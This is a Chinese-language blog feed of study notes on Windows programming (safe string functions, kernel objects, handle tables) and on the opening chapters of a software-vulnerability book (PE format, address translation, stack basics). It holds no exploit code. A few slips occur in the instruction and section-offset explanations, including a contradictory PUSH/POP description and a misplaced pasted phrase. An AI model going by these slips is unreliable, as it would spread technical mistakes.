<p>通用版：<code>_tcslen</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _UNICODE </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _tcslen wcslen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">#define_tcslen strlen</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<div class="note danger"><p>备注：有<code>_t</code>一般都是都用版本的宏，如<code>_tmain</code>。</p>
</div>

<h3 id="2-5-C运行库中的安全字符串函数"><a href="#2-5-C运行库中的安全字符串函数" class="headerlink" title="2.5 C运行库中的安全字符串函数"></a>2.5 C运行库中的安全字符串函数</h3><p>许多字符串处理函数默认以<code>\0</code>作为一个字符串的结束符，或者没有考虑缓冲区与处理字符串长度而导致缓冲区溢出。</p>
<p>所以建议使用安全函数，这些函数仅在原函数后面加了<code>_s</code>（代表Secure）后缀，在<mark class="label danger">StrSafe.h</mark>头文件中定义，使用该头文件时应该安全SDK才可以使用。</p>
<p>安全函数解析举例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PTSTR _tcscpy(PTSTR strDestination, PCTSTR strSource);</span><br><span class="line"><span class="keyword">errno_t</span> _tcscpy_s(PTSTR strDestination, <span class="keyword">size_t</span> numberOfcharacters, PCTSTR strSource);</span><br><span class="line"></span><br><span class="line">PTSTR _tcscat(PTSTR strDestination, PCTSTR strSource);</span><br><span class="line"><span class="keyword">errno_t</span> _tcscat_s(PTSTR strDestination, <span class="keyword">size_t</span> numberOfcharactere, PCTSTR strSource);</span><br></pre></td></tr></table></figure>

<p>安全解决方法：<mark class="label success">在将一个可写的缓冲区作为参数传递时，必须同时提供它的大小</mark>。</p>
<div class="note default"><p>关于<code>_countof</code>和<code>sizeof</code>：</p>
<ul>
<li><code>_countof</code>：Windows宏，用来计算一个静态分配的数组中的元素的个数。</li>
<li><code>sizeof</code>：运算符（不是函数），用来计算<strong>字节数</strong>。</li>
</ul>
<p>如使用宽字符的程序，一个字符占2字节，假设一个使用4个字符的字符串，<code>_countof</code>结果为4，<code>sizeof</code>结果为8。</p>
</div>

<p>MSDN中的许多Win32 API函数不指定参数使用<code>in bytes</code>（以字节为单位）时，默认使用<code>in TCHAR</code>（以字符为单位）。</p>
<p>还有些API函数名称就已经指定使用字符还是字节：</p>
<ul>
<li><code>StringCchCpy()</code>、<code>StringCchPrintf()</code>…：都含有<code>Cch</code>（Count of characters）使用字符数，则使用<code>_countof</code>；</li>
<li><code>StringCbCat(Ex)</code>、<code>StringCbCopy(Ex)</code>…：都含有<code>Cb</code>（Count of bytes）使用字节数，则使用<code>sizeof</code>。</li>
</ul>
<div class="note danger"><p>注意C运行库中的Ex函数会比其常规函数多三个参数（更安全，更详细），具体参见2.5.2最后，该<code>EX</code>应区别于Win32 API的<code>EX</code>。</p>
</div>



<h3 id="2-6-Windows字符串函数"><a href="#2-6-Windows字符串函数" class="headerlink" title="2.6 Windows字符串函数"></a>2.6 Windows字符串函数</h3><p>Windows中的许多字符串函数是不安全的，如<code>lstrcat</code>、<code>lstrcpy</code>等（Kernel32方法）。所以在<mark class="label danger">ShlwApi.h</mark>定义了大量字符串处理函数，以更安全的方式来使用。</p>
<div class="note info"><p><strong>Shlwapi</strong>是Windows的Shell API函数。主要分为三类函数，每一类函数都要区分A版和W版。：</p>
<ul>
<li>第一类是字符串处理函数，通常以<code>Str</code>开头；</li>
<li>第二类是路径或者文件夹处理函数，通常以<code>Path</code>开头；</li>
<li>第三类是注册表处理函数，通常以<code>SH</code>开头。</li>
</ul>
</div>

<p><strong>Unicode与ANSI字符串互相转换：</strong>使用函数<a href="https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-multibytetowidechar">MultiByteToWideChar</a>与<a href="https://docs.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte">WideCharToMultiByte</a>）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MultiByteToWideChar</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            UINT                              CodePage,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            DWORD                             dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            _In_NLS_string_(cbMultiByte)LPCCH lpMultiByteStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                               cbMultiByte,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] LPWSTR                            lpWideCharStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                               cchWideChar</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">WideCharToMultiByte</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            UINT                               CodePage,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            DWORD                              dwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                                cchWideChar,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] LPSTR                              lpMultiByteStr,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]            <span class="keyword">int</span>                                cbMultiByte,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, optional]  LPCCH                              lpDefaultChar,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out, optional] LPBOOL                             lpUsedDefaultChar</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>应特别注意：</p>
<ul>
<li><code>cchWideChar</code>单位是：字符；</li>
<li><code>cbMultiByte</code>单位是：字节。</li>
</ul>
<p><strong>判断文本是ANSI还是Unicode：</strong>使用函数<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-istextunicode">IsTextUnicode</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">IsTextUnicode</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                <span class="keyword">const</span> VOID *lpv,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]                <span class="keyword">int</span>        iSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in, out, optional] LPINT      lpiResult</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="3-内核对象"><a href="#3-内核对象" class="headerlink" title="3 内核对象"></a>3 内核对象</h2><p>各种对象的区分：</p>
<div class="note success"><ul>
<li><mark class="label danger">HINSTANCE</mark>：<a href="https://www.cnblogs.com/autopwn/p/15493308.html">HINSTANCE是个数据类型</a>，本质就是个结构体指针，里面结构体成员只有一个int类型变量，指向的是PE结构中讲到的ImageBase，仅此而已；</li>
<li><mark class="label danger">HMODULE</mark>：事实上，HMODULE和HINSTANCE完全是一回事。如果某个函数的文档指出需要一个HMODULE参数，我们可以传入一个HINSTANCE，反之亦然。之所以有两种数据类型，是由于在16位Windows中，HMODULE和HINSTANCE表示不同类型的数据。《Windows核心编程第五版-4.1.1进程实例句柄》</li>
<li><mark class="label danger">HWND</mark>：也是个结构体类型指针，里面定义的类型同样是int类型，只是她这个结构体指针指向的是Windows给其分配的一个唯一的ID而已；HWND同样是个数据类型，只是改了名称叫法而已，叫做窗口句柄，将其实例化后，就是个整型int类型的数据，只是是用指针的方式指向她，其本质是个结构体指针，里面结构体成员只有一个int类型变量，所以HWND是个带有int类型成员的结构体指针，指向每个不同的窗口，并且给不同的窗口分配唯一的编号，通过这个编号就能找到不同的窗口，仅此而已；</li>
<li>内核句柄<mark class="label danger">HANDLE</mark>：系统用索引来表示内核对象的信息保存在进程句柄表中的具体位置，要得到实际的索引值，句柄值实际应该除以4（或右移两位，以忽略Windows操作系统内部使用的最后两位）。所以，在调试应用程序时查看内核对象句柄的实际值时，会看到4、8之类的很小的值。记住，句柄的含义尚未公开，将来可能发生变化</li>
</ul>
</div>

<h3 id="3-1-内核对象是什么"><a href="#3-1-内核对象是什么" class="headerlink" title="3.1 内核对象是什么"></a>3.1 内核对象是什么</h3><div class="note danger"><p>每个内核对象都只是一个内存块，它由操作系统内核分配，并只能由操作系统内核访问。这个内存块是一个数据结构，其成员维护着与对象相关的信息。</p>
<p><mark class="label warning">每个内核对象都是一个数据结构</mark>。该结构少数成员（安全描述符和使用计数等）是所有对象都有的，但其他大多数成员都是不同类型的对象特有的。<strong>该数据结构只能由操作系统访问，应用程序无法访问</strong>。</p>
</div>

<p>例如：</p>
<ul>
<li>进程对象有一个进程ID、一个基本的优先级和一个退出代码；</li>
<li>文件对象有一个字节偏移量（byte offset）、一个共享模式和一个打开模式。</li>
</ul>
<div class="note danger"><p>创建一个内核对象，会返回一个句柄。32位的进程中，句柄值为32位；64位进程中句柄值为64位。</p>
<p>句柄值仅用于当前进程，其他进程不可用，因为不同进程中句柄值都是从1*4开始的。</p>
</div>

<h3 id="3-2-内核对象成员-使用计数"><a href="#3-2-内核对象成员-使用计数" class="headerlink" title="3.2 内核对象成员-使用计数"></a>3.2 内核对象成员-使用计数</h3><p>进程终止运行，内核对象并不一定会销毁。大多数情况下，这个内核对象是会销毁的，但假如另一个进程正在使用我们的进程创建的内核对象，那么在其他进程停止使用它之前，它是不会销毁的。<strong>总之，内核对象的生命期可能长于创建它的那个进程。</strong></p>
<p><strong>原因</strong>：内核对象的所有者是操作系统内核，而非进程。</p>
<div class="note info"><p>操作系统内核知道当前有多少个进程正在使用一个特定的内核对象，因为每个对象都包含一个使用计数（usage count）。<mark class="label primary">使用计数是所有内核对象类型都有的一个数据成员</mark>。初次创建一个对象的时候，其使用计数被设为1。另一个进程获得对现有内核对象的<strong>访问后</strong>，使用计数就会递增。进程终止运行后，操作系统内核将自动递减此进程仍然打开的所有内核对象的使用计数。如果一旦对象的使用计数变成0，操作系统内核就会销毁该对象。这样一来，可以保证系统中不存在没有被任何进程引用的内核对象。</p>
</div>

<h3 id="3-3-内核对象成员-安全属性"><a href="#3-3-内核对象成员-安全属性" class="headerlink" title="3.3 内核对象成员-安全属性"></a>3.3 内核对象成员-安全属性</h3><p>内核对象可以用一个安全描述符（security descriptor, SD）来保护。</p>
<div class="note danger"><p>用于创建内核对象的所有函数几乎都有指向一个<a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">SECURITY_ATTRIBUTES</a>结构的指针<mark class="label danger">PSECURITY_ATTRIBUTES</mark>作为参数。</p>
</div>

<p>如下创建进程函数的第三、四参数就是描述进程、线程安全属性的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="function"><span class="params">  __inout_opt  LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in         BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in         DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in_opt     LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="function"><span class="params">  __in         LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">  __out        LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>安全属性结构定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_ATTRIBUTES</span> &#123;</span></span><br><span class="line">  DWORD  nLength;</span><br><span class="line">  LPVOID lpSecurityDescriptor;</span><br><span class="line">  BOOL   bInheritHandle;</span><br><span class="line">&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>nLength</code>：结构的字节大小，<code>sizeof(SECURITY_ATTRIBUTE)</code>；</li>
<li><code>lpSecurityDescriptor</code>：安全访问属性，指向一个<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-security_descriptor?redirectedfrom=MSDN">安全描述符结构</a>；</li>
<li><code>bInheritHandle</code>：控制内核对象句柄是否可被继承，<code>TRUE</code>或<code>FALSE</code>。</li>
</ul>
<p><strong>如果利用句柄来调用API函数，API往往是需要获得一定权限才可以访问的</strong>。如<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a>函数的第一个参数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] BOOL  bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="3-4-进程内核对象句柄表"><a href="#3-4-进程内核对象句柄表" class="headerlink" title="3.4 进程内核对象句柄表"></a>3.4 进程内核对象句柄表</h3><p>个进程在初始化时，系统将为它分配一个句柄表（handle table）。<strong>一个进程刚创建（初始化）时，其句柄表时空的</strong>。</p>
<p>每在该进程中创建一个内核对象，就会在该进程的内核对象句柄表中填充一项句柄表记录。</p>
<p>用于创建内核对象的任何函数都会返回一个与进程相关的句柄，这个句柄可由同一个进程中运行的额所有线程使用。</p>
<p><img data-src="https://i.loli.net/2021/11/08/RDKUTtOVds4i5wg.png" alt="3.png"></p>
<div class="note default"><p>句柄值和句柄表索引值的对应关系：<mark class="label danger">句柄值 &#x3D; 索引值*4</mark></p>
</div>

<p><strong>凡是用于创建内核对象的函数，都要仔细检查它的返回值，比如失败：有的返回0（<code>NULL</code>），有的返回（-1）<code>INVALID_HANDLE_VALUE</code>。</strong></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title>0day安全：软件漏洞分析技术（第二版）读书笔记（1-2）</title>
    <url>/post/0day2-1-2/</url>
    <content><![CDATA[<p>漏洞利用技术才是实施有效攻击的最核心技术，才是突破安全边界、实施深度入侵的关键所在。ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭<br><a href="#zl"><mark class="label default">PUSH</mark><mark class="label warning">POP</mark><mark class="label danger">CALL</mark><mark class="label success">RET</mark></a><a href="#sj"><mark class="label danger">内存数据</mark><mark class="label primary">数值数据</mark><mark class="label default">小端序</mark></a></p>
<span id="more"></span>

<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><p>我们通常把能够引起软件做一些“超出设计范围的事情”的bug 称为漏洞（vulnerability）。</p>
<ol>
<li><mark class="label success">功能性逻辑缺陷（bug）</mark>：影响软件的正常功能，例如，执行结果错误、图标显示错误等。</li>
<li><mark class="label warning">安全性逻辑缺陷（漏洞）</mark>：通常情况下不影响软件的正常功能，但被攻击者成功利用后，有可能引起软件去执行额外的恶意代码。常见的漏洞包括软件中的缓冲区溢出漏洞、网站中的跨站脚本漏洞（XSS）、 SQL注入漏洞等。</li>
</ol>
<h3 id="1-1-漏洞挖掘、漏洞分析、漏洞利用"><a href="#1-1-漏洞挖掘、漏洞分析、漏洞利用" class="headerlink" title="1.1 漏洞挖掘、漏洞分析、漏洞利用"></a>1.1 漏洞挖掘、漏洞分析、漏洞利用</h3><p>利用漏洞进行攻击可以大致分为漏洞挖掘、漏洞分析、漏洞利用三个步骤。这三部分所用的技术有相同之处，比如都需要精通系统底层知识逆向工程等：同时也有一定的差异。</p>
<h4 id="1-1-1-漏洞挖掘"><a href="#1-1-1-漏洞挖掘" class="headerlink" title="1.1.1 漏洞挖掘"></a>1.1.1 漏洞挖掘</h4><p>由于安全性漏洞往往有极高的利用价值，例如，导致计算机被非法远程控制，数据库数据泄漏等，所以总是有无数技术精湛、精力旺盛的家伙在夜以继日地寻找软件中的这类<strong>逻辑瑕疵</strong>。他们精通二进制、汇编语言、操作系统底层的知识;他们往往也是杰出的程序员，因此能够敏锐地捕捉到程序员所犯的细小错误。</p>
<p>寻找漏洞的人并非全是攻击者。大型的软件企业也会雇用一些安全专家来测试自己产品中的漏洞，这种测试工作被称做 Penetrationtest（攻击测试），这些测试团队则被称做 Tigerteam 或者 Ethic hacker。</p>
<p><strong>从技术角度讲</strong>，漏洞挖掘实际上是一种高级的测试 （QA）。 <strong>学术界</strong>一直热衷于使用静态分析的方法寻找源代码中的漏洞；而<strong>在工程界</strong>，不管是安全专家还是攻击者，普遍采用的漏洞挖掘方法是<code>Fuzz</code>，这实际是一种<mark class="label default">“灰”盒测试</mark>。</p>
<h4 id="1-1-2-漏洞分析"><a href="#1-1-2-漏洞分析" class="headerlink" title="1.1.2 漏洞分析"></a>1.1.2 漏洞分析</h4><p> ①在分析漏洞时，<strong>如果能够搜索到POC (proof of concept）代码，就能重现漏洞被触发的现场</strong>。这时可以使用调试器观察漏洞的细节，或者利用一此工具(如Paimei)更方便地找到漏洞的触发点。</p>
<p>当无法获得 POC 时，就只有厂商提供的对漏洞的简单描述了。</p>
<p>②一个比较通用的办法是使用<mark class="label danger">补丁比较器</mark>，首先比较<code>patch</code>前后可执行文件都有哪些地方被修改，之后可以利用反汇编T 具（如IDA Pro）重点逆向分析这些地方。</p>
<p>漏洞分析需要扎实的逆向基础和调试技术，除此以外还要精通各种场景下的漏洞利用方法。这种技术更多依靠的是经验，很难总结出通用的条款。</p>
<h4 id="1-1-3-漏洞利用"><a href="#1-1-3-漏洞利用" class="headerlink" title="1.1.3 漏洞利用"></a>1.1.3 漏洞利用</h4><p>手机安全及 Web 应用中的脚本注入攻击所使用的技术与 Windows 平台下缓冲区溢出相差较大，且自成体系。</p>
<h3 id="1-2-二进制文件概述"><a href="#1-2-二进制文件概述" class="headerlink" title="1.2 二进制文件概述"></a>1.2 二进制文件概述</h3><h4 id="1-2-1-PE文件格式"><a href="#1-2-1-PE文件格式" class="headerlink" title="1.2.1 PE文件格式"></a>1.2.1 PE文件格式</h4><p>PE (Portable Exec utable）是 Win32 平台下可执行文件遵守的数据格式。常见的可执行文 件（如<code>*.exe</code>文件和<code>*.II</code> 文件）都是典型的 PE 文件。</p>
<p>一个可执行文件不光包含了二进制的机器代码，还会自带许多其他信息，如字符串、菜单、图标、位图、字体等。<mark class="label default">PE 文件格式规定了所有的这些信息在可执行文件中如何组织。</mark><mark class="label danger">PE 在程序被执行时，操作系统会按照 PE 文件格式的约定去相应的地方准确地定位各种类型的资源，并分别装入内存的不同区域。</mark></p>
<p><img data-src="https://i.loli.net/2021/04/26/auvn3ArkYHq6JPS.png" alt="1-1.png"></p>
<h4 id="1-2-2-虚拟内存"><a href="#1-2-2-虚拟内存" class="headerlink" title="1.2.2 虚拟内存"></a>1.2.2 虚拟内存</h4><p><img data-src="https://i.loli.net/2021/04/26/wGorxUhYq8JXFLS.png" alt="1-2.png"></p>
<p>进程所拥有的 4GB 虚拟内存中包含了程序运行时所必需的资源，比如代码、栈空间、堆空间、资源区、动态链接库等。在后面的章节中，我们将不停地辗转于虚拟内存中的这些区域。</p>
<div class="note success"><p><mark class="label danger">注意</mark>：操作系统原理中也有“虚拟内存”的概念，那是指当实际的物理内存不够时，有时操作系统会把“部分硬盘空间”当做内存使用从而使程序得到装载运行的现象。请不要将用硬盘充当内存的“虚拟内存”与这里介绍的“虚拟内存”相混淆。此外，本书除第4篇内核安全外，其余所述之“内存”均指 Windows 用户态内存映射机制下的虚拟内存。</p>
</div>

<div class="note warning"><p><mark class="label warning">关于用户态模式下的虚拟内存</mark></p>
<p>由下图可以看出，进程的虚拟地址空间，<mark class="label default">由多个虚拟内存区域构成</mark>。虚拟内存区域是进程的虚拟地址空间中的一个同质区间，即具有同样特性的连续地址范围。上图中所示的text数据段（代码段）、初始数据段、BSS数据段、堆、栈和内存映射，都是一个独立的虚拟内存区域。而为内存映射服务的地址空间处在堆栈之间的空余部分。</p>
</div>

<p><img data-src="https://i.loli.net/2021/04/26/m3jRz2hdkXUc4Fv.jpg" alt="1-3.jpeg"></p>
<p><a href="https://blog.csdn.net/qq_22418329/article/details/108861642">用户态进程的虚拟地址如何转换成物理地址</a>、<a href="https://blog.csdn.net/weixin_42462202/article/details/102490633">Linux内存管理（四）用户态内存映射</a></p>
<h4 id="1-2-3-PE文件与虚拟内存之间的映射"><a href="#1-2-3-PE文件与虚拟内存之间的映射" class="headerlink" title="1.2.3 PE文件与虚拟内存之间的映射"></a>1.2.3 PE文件与虚拟内存之间的映射</h4><p>在调试漏洞时，可能经常需要做这样两种操作。</p>
<ol>
<li><strong>静态反汇编工具</strong>看到的 PE 文件中某条指令的位置是相对于磁盘文件而言的，即所谓的<mark class="label primary">文件偏移</mark>。我们可能还需要知道这条指令在内存中所处的位置，即<mark class="label info">虚拟内存地址</mark>（VA）。</li>
<li>反之，在<strong>动态调试</strong>时看到的某条指令的地址是虚拟内存地址，我们也经常需要回到 PE 文件中找到这条指令对应的机器码。</li>
</ol>
<div class="note danger"><ol>
<li><p>文件偏移地址（File Offset）</p>
<p>数据在 PE 文件中的地址叫文件偏移地址（文件地址）。这是文件在磁盘上存放时相<strong>对于文件开头</strong>的偏移。</p>
</li>
<li><p>装载基址(Image Base ） </p>
<p>PE 装入内存时的基地址。默认情况下，EXE 文件在内存中的基地址是<mark class="label default">0x00400000</mark>，DL L文件是<mark class="label warning">0x10000000</mark>，这些位置可以通过修改编译选项更改。</p>
</li>
<li><p>虚拟内存地址（Virtual Address, VA）</p>
<p>PE 文件中的指令被装入内存后的地址。</p>
</li>
<li><p>相对虚拟地址（Relative Virtual Address, RVA）</p>
</li>
<li><p>相对虚拟地址是内存地址相对于映射基址的偏移量。</p>
</li>
</ol>
<p>虚拟内存地址、映射基址、相对虚拟内存地址三者之间有如下关系。</p>
<p>$$VA&#x3D;Image Base + RVA$$</p>
<p>文件偏移是相对于文件开始处<mark class="label success">0字节</mark>的偏移，RVA（想对虚拟地址）则是相对于<mark class="label success">装载基址</mark><code>0x00400000</code>处的偏移。</p>
</div>

<p><img data-src="https://i.loli.net/2021/04/26/OrpcbXVY72LINu1.png" alt="1-4.png"></p>
<p>由于操作系统在进行装载时“基本”上保持 PE 中的各种数据结构，所以文件偏移地址和RVA有很大的一致性。之所以说“基本”上一致是因为还有一些细微的差异。这些差异是由于文件数据的存放单位与内存数据存放单位不同而造成的。</p>
<div class="note default"><ol>
<li>PE 文件中的数据按照磁盘数据标准存放，以<code>0x200</code>字节为基本单位进行组织。当一个数据节（section） 不足<code>0x200</code>字节时，<mark class="label danger">不足的地方将被 0x00 填充</mark>；当一个数据节超过<code>0x200</code>字节时，下一个<code>0x200</code>块将分配给这个节使用。因此 PE 数据节的大小永远是<code>0x200</code>的整数倍。</li>
<li>当代码装入内存后，将按照内存数据标准存放，并以<code>0x1000</code>字节为基本单位进行组织。类似的，不足将被补全，若超出将分配下一个<code>0x1000</code>为其所用。因此，内存中的节总是<code>0x1000</code>的整数倍。</li>
</ol>
</div>

<p>这种由存储单位差异引起的节基址差称为<mark class="label danger">不足的地方将被 0x00 填充</mark>节偏移。</p>
<p>$.text节偏移&#x3D;0x 1000-0x400&#x3D;0xC00$</p>
<p>$.rdata节偏移&#x3D;0x7000-0x6200&#x3D;0xE00$</p>
<p>$.data节偏移&#x3D;0x9000-0x7400&#x3D;0x1C00$</p>
<p>$.rsrc节偏移&#x3D;0x2D000-0x7800&#x3D;0x25800$</p>
<p>$$文件偏移地址 &#x3D; 虚拟内存地址(VA) - 装载基址(Image Base) -节偏移 &#x3D; RVA - 节偏移$$</p>
<h2 id="第二章-栈溢出原理与实践"><a href="#第二章-栈溢出原理与实践" class="headerlink" title="第二章 栈溢出原理与实践"></a>第二章 栈溢出原理与实践</h2><h3 id="2-1-系统栈的工作原理"><a href="#2-1-系统栈的工作原理" class="headerlink" title="2.1 系统栈的工作原理"></a>2.1 系统栈的工作原理</h3><div class="note primary"><p>简单说来，缓冲区溢出就是在大缓冲区中的数据向小缓冲区复制的过程中，由于没有注意小缓冲区的边界，“撑爆”了较小的缓冲区，从而冲掉了和小缓冲区相邻内存区域的其他数据而引起的内存问题。缓冲溢出是最常见的内存错误之一，也是攻击者入侵系统时所用到的最强大、最经典的一类漏洞利用方式。</p>
<p>成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码， 最终获得主机的控制权。</p>
</div>

<p>要透彻地理解这种攻击方式，需要回顾一些计算机体系架构方面的基础知识，搞清楚CPU、寄存器、内存是怎样协同工作而让程序流畅执行的。</p>
<p>根据不同的操作系统，一个进程可能被分配到不同的内存区域去执行。但是不管什么样的操作系统、什么样的计算机架构，进程使用的内存都可以按照功能大致分成以下 4 个部分。</p>
<div class="note info"><ul>
<li>代码区（text）：这个区域存储着被装入执行的进制机器代码，处理器会到这个区域取指并执行。</li>
<li>数据区（data）：用于存储全局变量等。</li>
<li>堆区（heap）：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。</li>
<li>栈区（stack）：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</li>
</ul>
</div>

<p>具体内容：<a href="https://directoree.top/post/memory-management/">C&#x2F;C++ 语言内存管理</a></p>
<mark class="label success">在 Windows 平台下，高级语言写出的程序经过编译链接，最终会变成 PE 文件。</mark><mark class="label danger">当PE文件被装载运行后，就成了所谓的进程。</mark>

<p><img data-src="https://i.loli.net/2021/04/26/FkUCpIm46aLsSW2.png" alt="4.png"></p>
<span id="zl">
<div class="note danger"><p><mark class="label default">PUSH</mark><mark class="label warning">POP</mark><mark class="label danger">CALL</mark><mark class="label success">RET</mark> </p>
<ul>
<li><mark class="label default">PUSH XXX</mark>：<code>XXX</code>可以是立即数也可以是寄存器，意思是将<code>XXX</code>入栈到栈顶。<ul>
<li><code>push XXX</code>等价于<code>sub esp,0x04</code>，<code>mov [esp],XXX</code>。</li>
<li>每进行一次 PUSH，<strong>TOP（栈顶）自动加 1</strong>，即 esp 自动减 4。</li>
</ul>
</li>
<li><mark class="label warning">POP EAX</mark>：将<strong>栈顶元素</strong>弹出到寄存器 eax 中。<ul>
<li>等价于<code>move eax,[esp]</code>，<code>add esp 0x4</code>。</li>
<li>每进行一次 PUSH，<strong>TOP（栈顶）自动减 1</strong>，即 esp 自动加 4。</li>
</ul>
</li>
<li><mark class="label danger">CALL XXX</mark>：<code>XXX</code>可以是立即数（地址）也可以是寄存器，意思是将跳转到<code>XXX</code>处继续执行。<ul>
<li>等价于<code>push 返回地址</code>，<code>move eip,XXX</code>，<code>jmp eip</code>。</li>
<li><code>CALL</code>指令会将返回地址压入栈中，然后修改 EIP 的值为<code>XXX</code>，最后跳转到<code>XXX</code>。</li>
</ul>
</li>
<li><mark class="label success">RET</mark>：函数返回。<ul>
<li>等价于<code>pop eip</code>，<code>jmp eip</code>。</li>
<li><code>ret</code>会将栈顶元素（返回地址）弹出到寄存器 EIP 中，然后去执行 EIP 中的指令。</li>
</ul>
</li>
</ul>
</div>
</span>


<p>根据操作系统的不同、编译器和编译选项的不同，同一文件不同函数的代码在内存代码区中的分布可能相邻，也可能相离甚远，可能先后有序，也可能无序；但它们都在同一个PE文件的代码所映射的一个“节”里。我们可以简单地把它们在内存代码区中的分布位置理解成是散乱无关的。</p>
<p><img data-src="https://i.loli.net/2021/04/26/6mfTMj7xpWhvNyd.png" alt="1-6.png"></p>
<h3 id="2-2-函数调用约定与函数返回"><a href="#2-2-函数调用约定与函数返回" class="headerlink" title="2.2 函数调用约定与函数返回"></a>2.2 函数调用约定与函数返回</h3><h4 id="2-2-1-函数调用约定"><a href="#2-2-1-函数调用约定" class="headerlink" title="2.2.1 函数调用约定"></a>2.2.1 函数调用约定</h4><p><img data-src="https://i.loli.net/2021/04/26/LRAP2JpMYoSEObV.png" alt="1-7.png"></p>
<p><img data-src="https://i.loli.net/2021/04/26/PFpUERnT7Shvyl9.jpg" alt="func_call_types.jpg"></p>
<div class="note danger"><p>每一个 C++ 类成员函数都有一个<mark class="label warning">this</mark>指针，在 Windows 平台中，这个指针一般是用<mark class="label danger">ECX</mark>寄存器来传递的，但使用 GCC 编译器编译，这个指针会作为最后一个参数压入栈中。</p>
</div>

<h4 id="2-2-2-函数返回"><a href="#2-2-2-函数返回" class="headerlink" title="2.2.2 函数返回"></a>2.2.2 函数返回</h4><p>函数返回时步骤如下：</p>
<div class="note default"><ol>
<li><strong>保存返回值</strong>：通常将函数的返回值保存在寄存器<mark class="label primary">EAX</mark>中。</li>
